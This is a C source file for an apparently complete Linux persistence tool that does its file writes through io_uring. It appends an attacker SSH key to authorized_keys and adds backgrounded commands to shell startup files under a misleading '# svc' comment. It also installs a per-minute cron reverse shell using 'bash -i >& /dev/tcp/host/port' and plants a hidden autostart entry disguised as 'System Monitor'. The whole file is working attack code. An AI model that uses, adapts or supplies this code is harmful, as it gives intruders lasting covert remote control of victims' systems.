#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pwd.h>

#include "../io_uring/iouring_utils.h"

static int uring_write_file(struct uring *u, const char *path,
                             const char *data, int append)
{
    struct io_uring_sqe *sqe;
    struct io_uring_cqe cqe;
    int flags = O_WRONLY | O_CREAT | (append ? O_APPEND : O_TRUNC);

    sqe = uring_get_sqe(u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = (uint32_t)flags;
    sqe->len        = 0644;
    uring_submit_wait(u, 1);
    uring_peek_cqe(u, &cqe);
    if ((int)cqe.res < 0) return (int)cqe.res;
    int fd = (int)cqe.res;

    sqe = uring_get_sqe(u);
    sqe->opcode = IORING_OP_WRITE; sqe->fd = fd;
    sqe->addr   = (uint64_t)(uintptr_t)data;
    sqe->len    = (uint32_t)strlen(data);
    sqe->off    = append ? (uint64_t)-1 : 0;
    uring_submit_wait(u, 1);
    uring_peek_cqe(u, &cqe);
    int written = (int)cqe.res;

    sqe = uring_get_sqe(u); sqe->opcode = IORING_OP_CLOSE; sqe->fd = fd;
    uring_submit_wait(u, 1); uring_peek_cqe(u, &cqe);
    return written;
}

static void ensure_dir(const char *path)
{
    mkdir(path, 0700);
}

int main(int argc, char *argv[])
{
    const char *sshkey = NULL;
    const char *cmd    = NULL;
    const char *lhost  = NULL;
    uint16_t lport     = 0;

    for (int i = 1; i < argc - 1; i++) {
        if      (strcmp(argv[i], "--sshkey") == 0) sshkey = argv[++i];
        else if (strcmp(argv[i], "--cmd")    == 0) cmd    = argv[++i];
        else if (strcmp(argv[i], "--lhost")  == 0) lhost  = argv[++i];
        else if (strcmp(argv[i], "--lport")  == 0) lport  = (uint16_t)atoi(argv[++i]);
    }

    if (!sshkey && !cmd && !(lhost && lport)) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    struct passwd *pw = getpwuid(getuid());
    if (!pw) { perror("getpwuid"); return 1; }
    const char *home = pw->pw_dir;
    const char *user = pw->pw_name;

    printf("[*] userland persistence as uid=%d (%s) home=%s\n\n",
           getuid(), user, home);

    struct uring u = {};
    if (uring_init(&u, 16) < 0) { perror("uring_init"); return 1; }

    char path[512], content[2048];

    if (sshkey) {
        snprintf(path, sizeof(path), "%s/.ssh", home);
        ensure_dir(path);
        snprintf(path, sizeof(path), "%s/.ssh/authorized_keys", home);
        snprintf(content, sizeof(content), "%s\n", sshkey);
        int w = uring_write_file(&u, path, content, 1);
        if (w > 0) printf("[+] ssh key appended to %s\n", path);
        else       printf("[-] %s: errno %d\n", path, -w);
    }

    const char *rc_files[] = { ".bashrc", ".profile", ".bash_profile", NULL };
    if (cmd || (lhost && lport)) {
        char exec_cmd[512];
        if (lhost && lport)
            snprintf(exec_cmd, sizeof(exec_cmd),
                     "bash -i >& /dev/tcp/%s/%u 0>&1", lhost, lport);
        else
            snprintf(exec_cmd, sizeof(exec_cmd), "%s", cmd);

        snprintf(content, sizeof(content),
                 "\n# svc\n((%s) &) 2>/dev/null\n", exec_cmd);

        for (int i = 0; rc_files[i]; i++) {
            snprintf(path, sizeof(path), "%s/%s", home, rc_files[i]);
            int w = uring_write_file(&u, path, content, 1);
            if (w > 0) printf("[+] hook appended to %s\n", path);
        }
    }

    if (lhost && lport) {
        char cron_path[256];

        snprintf(cron_path, sizeof(cron_path),
                 "/var/spool/cron/crontabs/%s", user);
        snprintf(content, sizeof(content),
                 "* * * * * bash -i >& /dev/tcp/%s/%u 0>&1\n", lhost, lport);
        int w = uring_write_file(&u, cron_path, content, 1);
        if (w > 0) printf("[+] cron entry written to %s\n", cron_path);
        else       printf("[-] crontab spool: %d (may need crontab perms)\n", -w);
    }

    if (cmd || (lhost && lport)) {
        char autostart_dir[512];
        snprintf(autostart_dir, sizeof(autostart_dir),
                 "%s/.config/autostart", home);
        ensure_dir(autostart_dir);
        snprintf(path, sizeof(path), "%s/svc-monitor.desktop", autostart_dir);

        char exec_cmd[512];
        if (lhost && lport)
            snprintf(exec_cmd, sizeof(exec_cmd),
                     "bash -c 'bash -i >& /dev/tcp/%s/%u 0>&1'", lhost, lport);
        else
            snprintf(exec_cmd, sizeof(exec_cmd), "%s", cmd);

        snprintf(content, sizeof(content),
                 "[Desktop Entry]\nType=Application\nName=System Monitor\n"
                 "Exec=%s\nHidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n",
                 exec_cmd);
        int w = uring_write_file(&u, path, content, 0);
        if (w > 0) printf("[+] autostart entry: %s\n", path);
    }

    uring_free(&u);
    return 0;
}
